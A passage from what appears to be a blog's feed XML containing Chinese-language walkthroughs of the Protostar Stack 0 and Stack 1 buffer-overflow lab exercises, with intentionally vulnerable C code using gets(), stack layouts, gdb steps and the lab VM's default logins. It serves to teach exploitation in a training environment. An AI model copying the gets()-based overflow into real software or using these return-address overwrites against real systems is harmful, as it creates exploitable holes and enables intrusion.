class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">win</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">  <span class="built_in">printf</span>(<span class="string">"code flow successfully changed\n"</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">char</span> buffer[<span class="number">64</span>];</div><div class="line"></div><div class="line">  gets(buffer);</div><div class="line">&#125;</div></pre></td></tr></table></figure><ul><li><p>先分析一下，可以发现这个程序很简单，看上去没有可以直接控制eip的方法，但函数的调用过程在结束的时候会将保存的返回地址存在栈中，ret指令的时候会将传给eip。所以我们可以覆盖对应的返回地址值达到控制eip</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">______________</div><div class="line">|<span class="string">            </span>|<span class="string">  &lt;---esp</span></div><div class="line">--------------</div><div class="line">|<span class="string">  局部变量1  </span>|</div><div class="line">--------------</div><div class="line">|<span class="string">  局部变量2  </span>|</div><div class="line">--------------</div><div class="line">|<span class="string"> ...        </span>|</div><div class="line">--------------</div><div class="line">|<span class="string">            </span>|<span class="string">  &lt;---new ebp</span></div><div class="line">--------------</div><div class="line">|<span class="string">   old ebp  </span>|</div><div class="line">--------------</div><div class="line">|<span class="string">  返回地址   </span>|<span class="string">  ret --------&gt; eip</span></div><div class="line">--------------</div></pre></td></tr></table></figure></li><li><p>和前面一样，这次我们之间利用Python编写exp测试脚本，可以发现SSSS覆盖了old ebp，TTTT覆盖了返回地址</p></li></ul><p><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-Stack%201/1-9.png?raw=true" alt="1-9"><br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-Stack%201/1-8.png?raw=true" alt="1-8"><br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-Stack%201/1-10.png?raw=true" alt="1-10"></p><ul><li>我们查看win()的地址，重新编写对应exp，然后将TTTT改为其地址，成功达到目的。</li></ul><p><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-Stack%201/1-11.png?raw=true" alt="1-11"></p><p><strong>成功执行win()函数</strong><br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-Stack%201/1-12.png?raw=true" alt="1-12"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-序&quot;&gt;&lt;a href=&quot;#0x00-序&quot; class=&quot;headerlink&quot; title=&quot;0x00 序&quot;&gt;&lt;/a&gt;0x00 序&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt; 接着之前的系列，下面研究两种控制eip的方式&lt;/p&gt;
&lt;/blockquote&gt;
      
    
    </summary>
    
      <category term="Linux堆栈漏洞学习系列" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/Linux%E5%A0%86%E6%A0%88%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%B3%BB%E5%88%97/"/>
    
    
      <category term="Linux" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Linux/"/>
    
      <category term="Protostar" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Protostar/"/>
    
      <category term="栈溢出" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    
  </entry>
  
  <entry>
    <title>Protostar-栈溢出学习-简单栈溢出修改局部变量值</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2017/04/11/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-Stack%200/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-Stack%200/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2017/04/11/Protostar-栈溢出系列学习-Stack 0/Protostar-栈溢出系列学习-Stack 0/</id>
    <published>2017-04-11T03:12:19.000Z</published>
    <updated>2017-05-02T14:33:23.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-序"><a href="#0x01-序" class="headerlink" title="0x01 序"></a>0x01 序</h2><blockquote><p> 为了加强自己在漏洞利用方面的能力，准备做一个栈溢出和堆溢出利用的系列学习，从最简单的栈溢出学习开始，学习平台是本地搭建的一个基于linux系统的Protostar学习虚拟机环境，里面有从易到难的示例溢出漏洞程序。那就开始吧！</p></blockquote><h2 id="0x01-Protostar虚拟机环境搭建"><a href="#0x01-Protostar虚拟机环境搭建" class="headerlink" title="0x01 Protostar虚拟机环境搭建"></a>0x01 Protostar虚拟机环境搭建</h2><p><a href="https : //exploit-exercises.com/download/">虚拟机下载地址</a></p><p><a href="https://youtu.be/Y-4WHf0of6Y" target="_blank" rel="external">虚拟机环境搭建视频教程</a></p><p><strong>默认用户名和密码:</strong></p><ul><li><code>user:user</code> </li><li><code>root:godmode</code></li></ul><p>虚拟机启动后，输入bash进入终端界面</p><p>漏洞程序在<code>/opt/protostar/bin</code>目录下</p><h2 id="0x01-C语言源代码"><a href="#0x01-C语言源代码" class="headerlink" title="0x01 C语言源代码"></a>0x01 C语言源代码</h2><p>This level introduces the concept that memory can be accessed outside of its allocated region, <strong>how the stack variables are laid out, and that modifying outside of the allocated memory can modify program execution</strong>.</p><p>This level is at <code>/opt/protostar/bin/stack0</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">volatile</span> <span class="keyword">int</span> modified;</div><div class="line">  <span class="keyword">char</span> buffer[<span class="number">64</span>];</div><div class="line"></div><div class="line">  modified = <span class="number">0</span>;</div><div class="line">  gets(buffer);</div><div class="line"></div><div class="line">  <span class="keyword">if</span>(modified != <span class="number">0</span>) &#123;</div><div class="line">      <span class="built_in">printf</span>(<span class="string">"you have changed the 'modified' variable\n"</span>);</div><div class="line">  &#125; <span class="keyword">else</span> &#123;</div><div class="line">      <span class="built_in">printf</span>(<span class="string">"Try again?\n"</span>);</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h2 id="0x02-思路-amp-分析"><a href="#0x02-思路-amp-分析" class="headerlink" title="0x02 思路&amp;分析"></a>0x02 思路&amp;分析</h2><p>这个栈溢出很简单，首先在栈上分配了64字节大小的空间，然后根据modified的值来决定执行流程，但modified始终等于0。所以我们需要利用栈溢出去修改modified的值。</p><h2 id="0x03-调试-amp-利用"><a href="#0x03-调试-amp-利用" class="headerlink" title="0x03 调试&amp;利用"></a>0x03 调试&amp;利用</h2><ol><li>gdb连接到stack0，下<code>break *main</code>在main函数上下断点，然后<code>set disassembly-flavor intel</code>设置intel汇编指令格式,在<code>0x08048411</code>出下个断点</li></ol><p><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-Stack%200/0-1.png?raw=true" alt="0-1"></p><ol><li><p>利用define hook-stop在断点触发时观察栈变量和寄存器的值</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&gt;<span class="meta">info</span> registers </div><div class="line">&gt;x/<span class="number">24</span>wx $esp</div><div class="line">&gt;<span class="meta">end</span></div></pre></td></tr></table></figure><p><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-Stack%200/0-2.png?raw=true" alt="0-2"><br>由上图可以发现，当我们输入几个A后，<code>0xbffff762</code>地址已经被写入了0x41,<br>然后我们再查看modified的值发现没有变化，通过计算发现为buffer偏移4+16*3+12字节出。</p></li><li><p>利用Python写入4+16*3+14字节数的A，发现成功修改modified的值，改变其执行流程。<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-Stack%200/0-3.png?raw=true" alt="0-3"></p></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x01-序&quot;&gt;&lt;a href=&quot;#0x01-序&quot; class=&quot;headerlink&quot; title=&quot;0x01 序&quot;&gt;&lt;/a&gt;0x01 序&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt; 为了加强自己在漏洞利用方面的能力，准备做一个栈溢出和堆溢出利用的系列学习，从最简
      
    
    </summary>
    
      <category term="Linux堆栈漏洞学习系列" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/Linux%E5%A0%86%E6%A0%88%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%B3%BB%E5%88%97/"/>
    
    
      <category term="Linux" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Linux/"/>
    
      <category term="Protostar" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Protostar/"/>
    
      <category term="栈溢出" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    
  </entry>
  
</feed>
